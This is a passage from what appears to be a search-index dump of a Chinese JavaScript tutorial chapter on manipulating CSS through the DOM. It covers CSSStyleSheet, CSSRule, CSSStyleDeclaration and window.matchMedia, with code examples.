\u5b9e\u4f8b\uff09\uff0c\u91cc\u9762\u6bcf\u4e00\u4e2a\u6210\u5458\u5c31\u662f\u5f53\u524d\u6837\u5f0f\u8868\u7684\u4e00\u6761 CSS \u89c4\u5219\u3002\u4f7f\u7528\u8be5\u89c4\u5219\u7684 cssText \u5c5e\u6027\uff0c\u53ef\u4ee5\u5f97\u5230 CSS \u89c4\u5219\u5bf9\u5e94\u7684\u5b57\u7b26\u4e32\u3002 1 2 3 4 5 6 7 var sheet = document . querySelector ( '#styleElement' ). sheet ; sheet . cssRules [ 0 ]. cssText // \"body { background-color: red; margin: 20px; }\" sheet . cssRules [ 1 ]. cssText // \"p { line-height: 1.4em; color: blue; }\" \u6bcf\u6761 CSS \u89c4\u5219\u8fd8\u6709\u4e00\u4e2a style \u5c5e\u6027\uff0c\u6307\u5411\u4e00\u4e2a\u5bf9\u8c61\uff0c\u7528\u6765\u8bfb\u5199\u5177\u4f53\u7684 CSS \u547d\u4ee4\u3002 1 2 cssStyleSheet . cssRules [ 0 ]. style . color = 'red' ; cssStyleSheet . cssRules [ 1 ]. style . color = 'purple' ; \uff089\uff09CSSStyleSheet.ownerRule \u6709\u4e9b\u6837\u5f0f\u8868\u662f\u901a\u8fc7 @import \u89c4\u5219\u8f93\u5165\u7684\uff0c\u5b83\u7684 ownerRule \u5c5e\u6027\u4f1a\u8fd4\u56de\u4e00\u4e2a CSSRule \u5b9e\u4f8b\uff0c\u4ee3\u8868\u90a3\u884c @import \u89c4\u5219\u3002\u5982\u679c\u5f53\u524d\u6837\u5f0f\u8868\u4e0d\u662f\u901a\u8fc7 @import \u5f15\u5165\u7684\uff0c ownerRule \u5c5e\u6027\u8fd4\u56de null \u3002 \u5b9e\u4f8b\u65b9\u6cd5 \u00b6 \uff081\uff09CSSStyleSheet.insertRule() CSSStyleSheet.insertRule \u65b9\u6cd5\u7528\u4e8e\u5728\u5f53\u524d\u6837\u5f0f\u8868\u7684\u63d2\u5165\u4e00\u4e2a\u65b0\u7684 CSS \u89c4\u5219\u3002 1 2 3 var sheet = document . querySelector ( '#styleElement' ). sheet ; sheet . insertRule ( '#block { color: white }' , 0 ); sheet . insertRule ( 'p { color: red }' , 1 ); \u8be5\u65b9\u6cd5\u53ef\u4ee5\u63a5\u53d7\u4e24\u4e2a\u53c2\u6570\uff0c\u7b2c\u4e00\u4e2a\u53c2\u6570\u662f\u8868\u793a CSS \u89c4\u5219\u7684\u5b57\u7b26\u4e32\uff0c\u8fd9\u91cc\u53ea\u80fd\u6709\u4e00\u6761\u89c4\u5219\uff0c\u5426\u5219\u4f1a\u62a5\u9519\u3002\u7b2c\u4e8c\u4e2a\u53c2\u6570\u662f\u8be5\u89c4\u5219\u5728\u6837\u5f0f\u8868\u7684\u63d2\u5165\u4f4d\u7f6e\uff08\u4ece0\u5f00\u59cb\uff09\uff0c\u8be5\u53c2\u6570\u53ef\u9009\uff0c\u9ed8\u8ba4\u4e3a0\uff08\u5373\u9ed8\u8ba4\u63d2\u5728\u6837\u5f0f\u8868\u7684\u5934\u90e8\uff09\u3002\u6ce8\u610f\uff0c\u5982\u679c\u63d2\u5165\u4f4d\u7f6e\u5927\u4e8e\u73b0\u6709\u89c4\u5219\u7684\u6570\u76ee\uff0c\u4f1a\u62a5\u9519\u3002 \u8be5\u65b9\u6cd5\u7684\u8fd4\u56de\u503c\u662f\u65b0\u63d2\u5165\u89c4\u5219\u7684\u4f4d\u7f6e\u5e8f\u53f7\u3002 \u6ce8\u610f\uff0c\u6d4f\u89c8\u5668\u5bf9\u811a\u672c\u5728\u6837\u5f0f\u8868\u91cc\u9762\u63d2\u5165\u89c4\u5219\u6709\u5f88\u591a \u9650\u5236 \u3002\u6240\u4ee5\uff0c\u8fd9\u4e2a\u65b9\u6cd5\u6700\u597d\u653e\u5728 try...catch \u91cc\u4f7f\u7528\u3002 \uff082\uff09CSSStyleSheet.deleteRule() CSSStyleSheet.deleteRule \u65b9\u6cd5\u7528\u6765\u5728\u6837\u5f0f\u8868\u91cc\u9762\u79fb\u9664\u4e00\u6761\u89c4\u5219\uff0c\u5b83\u7684\u53c2\u6570\u662f\u8be5\u6761\u89c4\u5219\u5728 cssRules \u5bf9\u8c61\u4e2d\u7684\u4f4d\u7f6e\u3002\u8be5\u65b9\u6cd5\u6ca1\u6709\u8fd4\u56de\u503c\u3002 1 document . styleSheets [ 0 ]. deleteRule ( 1 ); \u5b9e\u4f8b\uff1a\u6dfb\u52a0\u6837\u5f0f\u8868 \u00b6 \u7f51\u9875\u6dfb\u52a0\u6837\u5f0f\u8868\u6709\u4e24\u79cd\u65b9\u5f0f\u3002\u4e00\u79cd\u662f\u6dfb\u52a0\u4e00\u5f20\u5185\u7f6e\u6837\u5f0f\u8868\uff0c\u5373\u5728\u6587\u6863\u4e2d\u6dfb\u52a0\u4e00\u4e2a <style> \u8282\u70b9\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 // \u5199\u6cd5\u4e00 var style = document . createElement ( 'style' ); style . setAttribute ( 'media' , 'screen' ); style . innerHTML = 'body{color:red}' ; document . head . appendChild ( style ); // \u5199\u6cd5\u4e8c var style = ( function () { var style = document . createElement ( 'style' ); document . head . appendChild ( style ); return style ; })(); style . sheet . insertRule ( '.foo{color:red;}' , 0 ); \u53e6\u4e00\u79cd\u662f\u6dfb\u52a0\u5916\u90e8\u6837\u5f0f\u8868\uff0c\u5373\u5728\u6587\u6863\u4e2d\u6dfb\u52a0\u4e00\u4e2a <link> \u8282\u70b9\uff0c\u7136\u540e\u5c06 href \u5c5e\u6027\u6307\u5411\u5916\u90e8\u6837\u5f0f\u8868\u7684 URL\u3002 1 2 3 4 5 6 var linkElm = document . createElement ( 'link' ); linkElm . setAttribute ( 'rel' , 'stylesheet' ); linkElm . setAttribute ( 'type' , 'text/css' ); linkElm . setAttribute ( 'href' , 'reset-min.css' ); document . head . appendChild ( linkElm ); CSSRuleList \u63a5\u53e3 \u00b6 CSSRuleList \u63a5\u53e3\u662f\u4e00\u4e2a\u7c7b\u4f3c\u6570\u7ec4\u7684\u5bf9\u8c61\uff0c\u8868\u793a\u4e00\u7ec4 CSS \u89c4\u5219\uff0c\u6210\u5458\u90fd\u662f CSSRule \u5b9e\u4f8b\u3002 \u83b7\u53d6 CSSRuleList \u5b9e\u4f8b\uff0c\u4e00\u822c\u662f\u901a\u8fc7 StyleSheet.cssRules \u5c5e\u6027\u3002 1 2 3 4 5 6 7 8 // HTML \u4ee3\u7801\u5982\u4e0b // <style id=\"myStyle\"> // h1 { color: red; } // p { color: blue; } // </style> var myStyleSheet = document . getElementById ( 'myStyle' ). sheet ; var crl = myStyleSheet . cssRules ; crl instanceof CSSRuleList // true CSSRuleList \u5b9e\u4f8b\u91cc\u9762\uff0c\u6bcf\u4e00\u6761\u89c4\u5219\uff08CSSRule \u5b9e\u4f8b\uff09\u53ef\u4ee5\u901a\u8fc7 rules.item(index) \u6216\u8005 rules[index] \u62ff\u5230\u3002CSS \u89c4\u5219\u7684\u6761\u6570\u901a\u8fc7 rules.length \u62ff\u5230\u3002\u8fd8\u662f\u7528\u4e0a\u9762\u7684\u4f8b\u5b50\u3002 1 2 crl [ 0 ] instanceof CSSRule // true crl . length // 2 \u6ce8\u610f\uff0c\u6dfb\u52a0\u89c4\u5219\u548c\u5220\u9664\u89c4\u5219\u4e0d\u80fd\u5728 CSSRuleList \u5b9e\u4f8b\u64cd\u4f5c\uff0c\u800c\u8981\u5728\u5b83\u7684\u7236\u5143\u7d20 StyleSheet \u5b9e\u4f8b\u4e0a\uff0c\u901a\u8fc7 StyleSheet.insertRule() \u548c StyleSheet.deleteRule() \u64cd\u4f5c\u3002 CSSRule \u63a5\u53e3 \u00b6 \u6982\u8ff0 \u00b6 \u4e00\u6761 CSS \u89c4\u5219\u5305\u62ec\u4e24\u4e2a\u90e8\u5206\uff1aCSS \u9009\u62e9\u5668\u548c\u6837\u5f0f\u58f0\u660e\u3002\u4e0b\u9762\u5c31\u662f\u4e00\u6761\u5178\u578b\u7684 CSS \u89c4\u5219\u3002 1 2 3 4 . myClass { color : red ; background-color : yellow ; } JavaScript \u901a\u8fc7 CSSRule \u63a5\u53e3\u64cd\u4f5c CSS \u89c4\u5219\u3002\u4e00\u822c\u901a\u8fc7 CSSRuleList \u63a5\u53e3\uff08 StyleSheet.cssRules \uff09\u83b7\u53d6 CSSRule \u5b9e\u4f8b\u3002 1 2 3 4 5 6 7 8 9 10 11 // HTML \u4ee3\u7801\u5982\u4e0b // <style id=\"myStyle\"> // .myClass { // color: red; // background-color: yellow; // } // </style> var myStyleSheet = document . getElementById ( 'myStyle' ). sheet ; var ruleList = myStyleSheet . cssRules ; var rule = ruleList [ 0 ]; rule instanceof CSSRule // true CSSRule \u5b9e\u4f8b\u7684\u5c5e\u6027 \u00b6 \uff081\uff09CSSRule.cssText CSSRule.cssText \u5c5e\u6027\u8fd4\u56de\u5f53\u524d\u89c4\u5219\u7684\u6587\u672c\uff0c\u8fd8\u662f\u4f7f\u7528\u4e0a\u9762\u7684\u4f8b\u5b50\u3002 1 2 rule . cssText // \".myClass { color: red; background-color: yellow; }\" \u5982\u679c\u89c4\u5219\u662f\u52a0\u8f7d\uff08 @import \uff09\u5176\u4ed6\u6837\u5f0f\u8868\uff0c cssText \u5c5e\u6027\u8fd4\u56de @import 'url' \u3002 \uff082\uff09CSSRule.parentStyleSheet CSSRule.parentStyleSheet \u5c5e\u6027\u8fd4\u56de\u5f53\u524d\u89c4\u5219\u6240\u5728\u7684\u6837\u5f0f\u8868\u5bf9\u8c61\uff08StyleSheet \u5b9e\u4f8b\uff09\uff0c\u8fd8\u662f\u4f7f\u7528\u4e0a\u9762\u7684\u4f8b\u5b50\u3002 1 rule . parentStyleSheet === myStyleSheet // true \uff083\uff09CSSRule.parentRule CSSRule.parentRule \u5c5e\u6027\u8fd4\u56de\u5305\u542b\u5f53\u524d\u89c4\u5219\u7684\u7236\u89c4\u5219\uff0c\u5982\u679c\u4e0d\u5b58\u5728\u7236\u89c4\u5219\uff08\u5373\u5f53\u524d\u89c4\u5219\u662f\u9876\u5c42\u89c4\u5219\uff09\uff0c\u5219\u8fd4\u56de null \u3002 \u7236\u89c4\u5219\u6700\u5e38\u89c1\u7684\u60c5\u51b5\u662f\uff0c\u5f53\u524d\u89c4\u5219\u5305\u542b\u5728 @media \u89c4\u5219\u4ee3\u7801\u5757\u4e4b\u4e2d\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 // HTML \u4ee3\u7801\u5982\u4e0b // <style id=\"myStyle\"> // @supports (display: flex) { // @media screen and (min-width: 900px) { // article { // display: flex; // } // } // } // </style> var myStyleSheet = document . getElementById ( 'myStyle' ). sheet ; var ruleList = myStyleSheet . cssRules ; var rule0 = ruleList [ 0 ]; rule0 . cssText // \"@supports (display: flex) { // @media screen and (min-width: 900px) { // article { display: flex; } // } // }\" // \u7531\u4e8e\u8fd9\u6761\u89c4\u5219\u5185\u5d4c\u5176\u4ed6\u89c4\u5219\uff0c // \u6240\u4ee5\u5b83\u6709 cssRules \u5c5e\u6027\uff0c\u4e14\u8be5\u5c5e\u6027\u662f CSSRuleList \u5b9e\u4f8b rule0 . cssRules instanceof CSSRuleList // true var rule1 = rule0 . cssRules [ 0 ]; rule1 . cssText // \"@media screen and (min-width: 900px) { // article { display: flex; } // }\" var rule2 = rule1 . cssRules [ 0 ]; rule2 . cssText // \"article { display: flex; }\" rule1 . parentRule === rule0 // true rule2 . parentRule === rule1 // true \uff084\uff09CSSRule.type CSSRule.type \u5c5e\u6027\u8fd4\u56de\u4e00\u4e2a\u6574\u6570\u503c\uff0c\u8868\u793a\u5f53\u524d\u89c4\u5219\u7684\u7c7b\u578b\u3002 \u6700\u5e38\u89c1\u7684\u7c7b\u578b\u6709\u4ee5\u4e0b\u51e0\u79cd\u3002 1\uff1a\u666e\u901a\u6837\u5f0f\u89c4\u5219\uff08CSSStyleRule \u5b9e\u4f8b\uff09 3\uff1a @import \u89c4\u5219 4\uff1a @media \u89c4\u5219\uff08CSSMediaRule \u5b9e\u4f8b\uff09 5\uff1a @font-face \u89c4\u5219 CSSStyleRule \u63a5\u53e3 \u00b6 \u5982\u679c\u4e00\u6761 CSS \u89c4\u5219\u662f\u666e\u901a\u7684\u6837\u5f0f\u89c4\u5219\uff08\u4e0d\u542b\u7279\u6b8a\u7684 CSS \u547d\u4ee4\uff09\uff0c\u90a3\u4e48\u9664\u4e86 CSSRule \u63a5\u53e3\uff0c\u5b83\u8fd8\u90e8\u7f72\u4e86 CSSStyleRule \u63a5\u53e3\u3002 CSSStyleRule \u63a5\u53e3\u6709\u4ee5\u4e0b\u4e24\u4e2a\u5c5e\u6027\u3002 \uff081\uff09CSSStyleRule.selectorText CSSStyleRule.selectorText \u5c5e\u6027\u8fd4\u56de\u5f53\u524d\u89c4\u5219\u7684\u9009\u62e9\u5668\u3002 1 2 var stylesheet = document . styleSheets [ 0 ]; stylesheet . cssRules [ 0 ]. selectorText // \".myClass\" \u6ce8\u610f\uff0c\u8fd9\u4e2a\u5c5e\u6027\u662f\u53ef\u5199\u7684\u3002 \uff082\uff09CSSStyleRule.style CSSStyleRule.style \u5c5e\u6027\u8fd4\u56de\u4e00\u4e2a\u5bf9\u8c61\uff08CSSStyleDeclaration \u5b9e\u4f8b\uff09\uff0c\u4ee3\u8868\u5f53\u524d\u89c4\u5219\u7684\u6837\u5f0f\u58f0\u660e\uff0c\u4e5f\u5c31\u662f\u9009\u62e9\u5668\u540e\u9762\u7684\u5927\u62ec\u53f7\u91cc\u9762\u7684\u90e8\u5206\u3002 1 2 3 4 5 6 7 // HTML \u4ee3\u7801\u4e3a // <style id=\"myStyle\"> // p { color: red; } // </style> var styleSheet = document . getElementById ( 'myStyle' ). sheet ; styleSheet . cssRules [ 0 ]. style instanceof CSSStyleDeclaration // true CSSStyleDeclaration \u5b9e\u4f8b\u7684 cssText \u5c5e\u6027\uff0c\u53ef\u4ee5\u8fd4\u56de\u6240\u6709\u6837\u5f0f\u58f0\u660e\uff0c\u683c\u5f0f\u4e3a\u5b57\u7b26\u4e32\u3002 1 2 3 4 styleSheet . cssRules [ 0 ]. style . cssText // \"color: red;\" styleSheet . cssRules [ 0 ]. selectorText // \"p\" CSSMediaRule \u63a5\u53e3 \u00b6 \u5982\u679c\u4e00\u6761 CSS \u89c4\u5219\u662f @media \u4ee3\u7801\u5757\uff0c\u90a3\u4e48\u5b83\u9664\u4e86 CSSRule \u63a5\u53e3\uff0c\u8fd8\u90e8\u7f72\u4e86 CSSMediaRule \u63a5\u53e3\u3002 \u8be5\u63a5\u53e3\u4e3b\u8981\u63d0\u4f9b media \u5c5e\u6027\u548c conditionText \u5c5e\u6027\u3002\u524d\u8005\u8fd4\u56de\u4ee3\u8868 @media \u89c4\u5219\u7684\u4e00\u4e2a\u5bf9\u8c61\uff08MediaList \u5b9e\u4f8b\uff09\uff0c\u540e\u8005\u8fd4\u56de @media \u89c4\u5219\u7684\u751f\u6548\u6761\u4ef6\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 // HTML \u4ee3\u7801\u5982\u4e0b // <style id=\"myStyle\"> // @media screen and (min-width: 900px) { // article { display: flex; } // } // </style> var styleSheet = document . getElementById ( 'myStyle' ). sheet ; styleSheet . cssRules [ 0 ] instanceof CSSMediaRule // true styleSheet . cssRules [ 0 ]. media // { // 0: \"screen and (min-width: 900px)\", // appendMedium: function, // deleteMedium: function, // item: function, // length: 1, // mediaText: \"screen and (min-width: 900px)\" // } styleSheet . cssRules [ 0 ]. conditionText // \"screen and (min-width: 900px)\" window.matchMedia() \u00b6 \u57fa\u672c\u7528\u6cd5 \u00b6 window.matchMedia() \u65b9\u6cd5\u7528\u6765\u5c06 CSS \u7684 Media Query \u6761\u4ef6\u8bed\u53e5\uff0c\u8f6c\u6362\u6210\u4e00\u4e2a MediaQueryList \u5b9e\u4f8b\u3002 1 2 var mdl = window . matchMedia ( '(min-width: 400px)' ); mdl instanceof MediaQueryList // true \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u53d8\u91cf mdl \u5c31\u662f mediaQueryList \u7684\u5b9e\u4f8b\u3002 \u6ce8\u610f\uff0c\u5982\u679c\u53c2\u6570\u4e0d\u662f\u6709\u6548\u7684 MediaQuery \u6761\u4ef6\u8bed\u53e5\uff0c window.matchMedia \u4e0d\u4f1a\u62a5\u9519\uff0c\u4f9d\u7136\u8fd4\u56de\u4e00\u4e2a MediaQueryList \u5b9e\u4f8b\u3002 1 window . matchMedia ( 'bad string' ) instanceof MediaQueryList // true MediaQueryList \u63a5\u53e3\u7684\u5b9e\u4f8b\u5c5e\u6027 \u00b6 MediaQueryList \u5b9e\u4f8b\u6709\u4e09\u4e2a\u5c5e\u6027\u3002 \uff081\uff09MediaQueryList.media MediaQueryList.media \u5c5e\u6027\u8fd4\u56de\u4e00\u4e2a\u5b57\u7b26\u4e32\uff0c\u8868\u793a\u5bf9\u5e94\u7684 MediaQuery \u6761\u4ef6\u8bed\u53e5\u3002 1 2 var mql = window . matchMedia ( '(min-width: 400px)' ); mql . media // \"(min-width: 400px)\" \uff082\uff09MediaQueryList.matches MediaQueryList.matches \u5c5e\u6027\u8fd4\u56de\u4e00\u4e2a\u5e03\u5c14\u503c\uff0c\u8868\u793a\u5f53\u524d\u9875\u9762\u662f\u5426\u7b26\u5408\u6307\u5b9a\u7684 MediaQuery \u6761\u4ef6\u8bed\u53e5\u3002 1 2 3 4 5 if ( window . matchMedia ( '(min-width: 400px)' ). matches ) { /* \u5f53\u524d\u89c6\u53e3\u4e0d\u5c0f\u4e8e 400 \u50cf\u7d20 */ } else { /* \u5f53\u524d\u89c6\u53e3\u5c0f\u4e8e 400 \u50cf\u7d20 */ } \u4e0b\u9762\u7684\u4f8b\u5b50\u6839\u636e mediaQuery \u662f\u5426\u5339\u914d\u5f53\u524d\u73af\u5883\uff0c\u52a0\u8f7d\u76f8\u5e94\u7684 CSS \u6837\u5f0f\u8868\u3002 1 2 3 4 5 6 7 8 9 10 var result = window . matchMedia ( \"(max-width: 700px)\" ); if ( result . matches ){ var linkElm = document . createElement ( 'link' ); linkElm . setAttribute ( 'rel' , 'stylesheet' ); linkElm . setAttribute ( 'type' , 'text/css' ); linkElm . setAttribute ( 'href' , 'small.css' ); document . head . appendChild ( linkElm ); } \uff083\uff09MediaQueryList.onchange \u5982\u679c MediaQuery \u6761\u4ef6\u8bed\u53e5\u7684\u9002\u914d\u73af\u5883\u53d1\u751f\u53d8\u5316\uff0c\u4f1a\u89e6\u53d1 change \u4e8b\u4ef6\u3002 MediaQueryList.onchange \u5c5e\u6027\u7528\u6765\u6307\u5b9a change \u4e8b\u4ef6\u7684\u76d1\u542c\u51fd\u6570\u3002\u8be5\u51fd\u6570\u7684\u53c2\u6570\u662f change \u4e8b\u4ef6\u5bf9\u8c61\uff08MediaQueryListEvent \u5b9e\u4f8b\uff09\uff0c\u8be5\u5bf9\u8c61\u4e0e MediaQueryList \u5b9e\u4f8b\u7c7b\u4f3c\uff0c\u4e5f\u6709 media \u548c matches \u5c5e\u6027\u3002 1 2 3 4 5 6 7 8 9 var mql = window . matchMedia ( '(max-width: 600px)' ); mql . onchange = function ( e ) { if ( e . matches ) { /* \u89c6\u53e3\u4e0d\u8d85\u8fc7 600 \u50cf\u7d20 */ } else { /* \u89c6\u53e3\u8d85\u8fc7 600 \u50cf\u7d20 */ } } \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c change \u4e8b\u4ef6\u53d1\u751f\u540e\uff0c\u5b58\u5728\u4e24\u79cd\u53ef\u80fd\u3002\u4e00\u79cd\u662f\u663e\u793a\u5bbd\u5ea6\u4ece600\u50cf\u7d20\u4ee5\u4e0a\u53d8\u4e3a\u4ee5\u4e0b\uff0c\u53e6\u4e00\u79cd\u662f\u4ece600\u50cf\u7d20\u4ee5\u4e0b\u53d8\u4e3a\u4ee5\u4e0a\uff0c\u6240\u4ee5\u5728\u76d1\u542c\u51fd\u6570\u5185\u90e8\u8981\u5224\u65ad\u4e00\u4e0b\u5f53\u524d\u662f\u54ea\u4e00\u79cd\u60c5\u51b5\u3002 MediaQueryList \u63a5\u53e3\u7684\u5b9e\u4f8b\u65b9\u6cd5 \u00b6 MediaQueryList \u5b9e\u4f8b\u6709\u4e24\u4e2a\u65b9\u6cd5 MediaQueryList.addListener() \u548c MediaQueryList.removeListener() \uff0c\u7528\u6765\u4e3a change \u4e8b\u4ef6\u6dfb\u52a0\u6216\u64a4\u9500\u76d1\u542c\u51fd\u6570\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 var mql = window . matchMedia ( '(max-width: 600px)' ); // \u6307\u5b9a\u76d1\u542c\u51fd\u6570 mql . addListener ( mqCallback ); // \u64a4\u9500\u76d1\u542c\u51fd\u6570 mql . removeListener ( mqCallback ); function mqCallback ( e ) { if ( e . matches ) { /* \u89c6\u53e3\u4e0d\u8d85\u8fc7 600 \u50cf\u7d20 */ } else { /* \u89c6\u53e3\u8d85\u8fc7 600 \u50cf\u7d20 */ } } \u6ce8\u610f\uff0c MediaQueryList.removeListener() \u65b9\u6cd5\u4e0d\u80fd\u64a4\u9500 MediaQueryList.onchange \u5c5e\u6027\u6307\u5b9a\u7684\u76d1\u542c\u51fd\u6570\u3002","title":"CSS \u64cd\u4f5c"},{"location":"dom/css/#css","text":"CSS \u4e0e JavaScript \u662f\u4e24\u4e2a\u6709\u7740\u660e\u786e\u5206\u5de5\u7684\u9886\u57df\uff0c\u524d\u8005\u8d1f\u8d23\u9875\u9762\u7684\u89c6\u89c9\u6548\u679c\uff0c\u540e\u8005\u8d1f\u8d23\u4e0e\u7528\u6237\u7684\u884c\u4e3a\u4e92\u52a8\u3002\u4f46\u662f\uff0c\u5b83\u4eec\u6bd5\u7adf\u540c\u5c5e\u7f51\u9875\u5f00\u53d1\u7684\u524d\u7aef\uff0c\u56e0\u6b64\u4e0d\u53ef\u907f\u514d\u6709\u7740\u4ea4\u53c9\u548c\u4e92\u76f8\u914d\u5408\u3002\u672c\u7ae0\u4ecb\u7ecd\u5982\u4f55\u901a\u8fc7 JavaScript \u64cd\u4f5c CSS\u3002","title":"CSS \u64cd\u4f5c"},{"location":"dom/css/#html-style","text":"\u64cd\u4f5c CSS \u6837\u5f0f\u6700\u7b80\u5355\u7684\u65b9\u6cd5\uff0c\u5c31\u662f\u4f7f\u7528\u7f51\u9875\u5143\u7d20\u8282\u70b9\u7684 getAttribute() \u65b9\u6cd5\u3001 setAttribute() \u65b9\u6cd5\u548c removeAttribute() \u65b9\u6cd5\uff0c\u76f4\u63a5\u8bfb\u5199\u6216\u5220\u9664\u7f51\u9875\u5143\u7d20\u7684 style \u5c5e\u6027\u3002 1 2 3 4 div . setAttribute ( 'style' , 'background-color:red;' + 'border:1px solid black;' ); \u4e0a\u9762\u7684\u4ee3\u7801\u76f8\u5f53\u4e8e\u4e0b\u9762\u7684 HTML \u4ee3\u7801\u3002 1 < div style = \"background-color:red; border:1px solid black;\" /> style \u4e0d\u4ec5\u53ef\u4ee5\u4f7f\u7528\u5b57\u7b26\u4e32\u8bfb\u5199\uff0c\u5b83\u672c\u8eab\u8fd8\u662f\u4e00\u4e2a\u5bf9\u8c61\uff0c\u90e8\u7f72\u4e86 CSSStyleDeclaration \u63a5\u53e3\uff08\u8be6\u89c1\u4e0b\u9762\u7684\u4ecb\u7ecd\uff09\uff0c\u53ef\u4ee5\u76f4\u63a5\u8bfb\u5199\u4e2a\u522b\u5c5e\u6027\u3002 1 2 e . style . fontSize = '18px' ; e . style . color = 'black' ;","title":"HTML \u5143\u7d20\u7684 style \u5c5e\u6027"},{"location":"dom/css/#cssstyledeclaration","text":"","title":"CSSStyleDeclaration \u63a5\u53e3"},{"location":"dom/css/#_1","text":"CSSStyleDeclaration \u63a5\u53e3\u7528\u6765\u64cd\u4f5c\u5143\u7d20\u7684\u6837\u5f0f\u3002\u4e09\u4e2a\u5730\u65b9\u90e8\u7f72\u4e86\u8fd9\u4e2a\u63a5\u53e3\u3002 \u5143\u7d20\u8282\u70b9\u7684 style \u5c5e\u6027\uff08 Element.style \uff09 CSSStyle \u5b9e\u4f8b\u7684 style \u5c5e\u6027 window.getComputedStyle() \u7684\u8fd4\u56de\u503c CSSStyleDeclaration \u63a5\u53e3\u53ef\u4ee5\u76f4\u63a5\u8bfb\u5199 CSS \u7684\u6837\u5f0f\u5c5e\u6027\uff0c\u4e0d\u8fc7\uff0c\u8fde\u8bcd\u53f7\u9700\u8981\u53d8\u6210\u9a86\u9a7c\u62fc\u5199\u6cd5\u3002 1 2 3 4 5 6 7 8 9 10 11 12 var divStyle = document . querySelector ( 'div' ). style ; divStyle . backgroundColor = 'red' ; divStyle . border = '1px solid black' ; divStyle . width = '100px' ; divStyle . height = '100px' ; divStyle . fontSize = '10em' ; divStyle . backgroundColor // red divStyle . border // 1px solid black divStyle . height // 100px divStyle . width // 100px \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c style \u5c5e\u6027\u7684\u503c\u662f\u4e00\u4e2a CSSStyleDeclaration \u5b9e\u4f8b\u3002\u8fd9\u4e2a\u5bf9\u8c61\u6240\u5305\u542b\u7684\u5c5e\u6027\u4e0e CSS \u89c4\u5219\u4e00\u4e00\u5bf9\u5e94\uff0c\u4f46\u662f\u540d\u5b57\u9700\u8981\u6539\u5199\uff0c\u6bd4\u5982 background-color \u5199\u6210 backgroundColor \u3002\u6539\u5199\u7684\u89c4\u5219\u662f\u5c06\u6a2a\u6760\u4ece CSS \u5c5e\u6027\u540d\u4e2d\u53bb\u9664\uff0c\u7136\u540e\u5c06\u6a2a\u6760\u540e\u7684\u7b2c\u4e00\u4e2a\u5b57\u6bcd\u5927\u5199\u3002\u5982\u679c CSS \u5c5e\u6027\u540d\u662f JavaScript \u4fdd\u7559\u5b57\uff0c\u5219\u89c4\u5219\u540d\u4e4b\u524d\u9700\u8981\u52a0\u4e0a\u5b57\u7b26\u4e32 css \uff0c\u6bd4\u5982 float \u5199\u6210 cssFloat \u3002 \u6ce8\u610f\uff0c\u8be5\u5bf9\u8c61\u7684\u5c5e\u6027\u503c\u90fd\u662f\u5b57\u7b26\u4e32\uff0c\u8bbe\u7f6e\u65f6\u5fc5\u987b\u5305\u62ec\u5355\u4f4d\uff0c\u4f46\u662f\u4e0d\u542b\u89c4\u5219\u7ed3\u5c3e\u7684\u5206\u53f7\u3002\u6bd4\u5982\uff0c divStyle.width \u4e0d\u80fd\u5199\u4e3a 100 \uff0c\u800c\u8981\u5199\u4e3a 100px \u3002 \u53e6\u5916\uff0c Element.style \u8fd4\u56de\u7684\u53ea\u662f\u884c\u5185\u6837\u5f0f\uff0c\u5e76\u4e0d\u662f\u8be5\u5143\u7d20\u7684\u5168\u90e8\u6837\u5f0f\u3002\u901a\u8fc7\u6837\u5f0f\u8868\u8bbe\u7f6e\u7684\u6837\u5f0f\uff0c\u6216\u8005\u4ece\u7236\u5143\u7d20\u7ee7\u627f\u7684\u6837\u5f0f\uff0c\u65e0\u6cd5\u901a\u8fc7\u8fd9\u4e2a\u5c5e\u6027\u5f97\u5230\u3002\u5143\u7d20\u7684\u5168\u90e8\u6837\u5f0f\u8981\u901a\u8fc7 window.getComputedStyle() \u5f97\u5230\u3002","title":"\u7b80\u4ecb"},{"location":"dom/css/#cssstyledeclaration_1","text":"\uff081\uff09CSSStyleDeclaration.cssText CSSStyleDeclaration.cssText \u5c5e\u6027\u7528\u6765\u8bfb\u5199\u5f53\u524d\u89c4\u5219\u7684\u6240\u6709\u6837\u5f0f\u58f0\u660e\u6587\u672c\u3002 1 2 3 4 5 6 var divStyle = document . querySelector ( 'div' ). style ; divStyle . cssText = 'background-color: red;' + 'border: 1px solid black;' + 'height: 100px;' + 'width: 100px;' ; \u6ce8\u610f\uff0c cssText \u7684\u5c5e\u6027\u503c\u4e0d\u7528\u6539\u5199 CSS \u5c5e\u6027\u540d\u3002 \u5220\u9664\u4e00\u4e2a\u5143\u7d20\u7684\u6240\u6709\u884c\u5185\u6837\u5f0f\uff0c\u6700\u7b80\u4fbf\u7684\u65b9\u6cd5\u5c31\u662f\u8bbe\u7f6e cssText \u4e3a\u7a7a\u5b57\u7b26\u4e32\u3002 1 divStyle . cssText = '' ; \uff082\uff09CSSStyleDeclaration.length CSSStyleDeclaration.length \u5c5e\u6027\u8fd4\u56de\u4e00\u4e2a\u6574\u6570\u503c\uff0c\u8868\u793a\u5f53\u524d\u89c4\u5219\u5305\u542b\u591a\u5c11\u6761\u6837\u5f0f\u58f0\u660e\u3002 1 2 3 4 5 6 7 // HTML \u4ee3\u7801\u5982\u4e0b // <div id=\"myDiv\" // style=\"height: 1px;width: 100%;background-color: #CA1;\" // ></div> var myDiv = document . getElementById ( 'myDiv' ); var divStyle = myDiv . style ; divStyle . length // 3 \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c myDiv \u5143\u7d20\u7684\u884c\u5185\u6837\u5f0f\u5171\u5305\u542b3\u6761\u6837\u5f0f\u89c4\u5219\u3002 \uff083\uff09CSSStyleDeclaration.parentRule CSSStyleDeclaration.parentRule \u5c5e\u6027\u8fd4\u56de\u5f53\u524d\u89c4\u5219\u6240\u5c5e\u7684\u90a3\u4e2a\u6837\u5f0f\u5757\uff08CSSRule \u5b9e\u4f8b\uff09\u3002\u5982\u679c\u4e0d\u5b58\u5728\u6240\u5c5e\u7684\u6837\u5f0f\u5757\uff0c\u8be5\u5c5e\u6027\u8fd4\u56de null \u3002 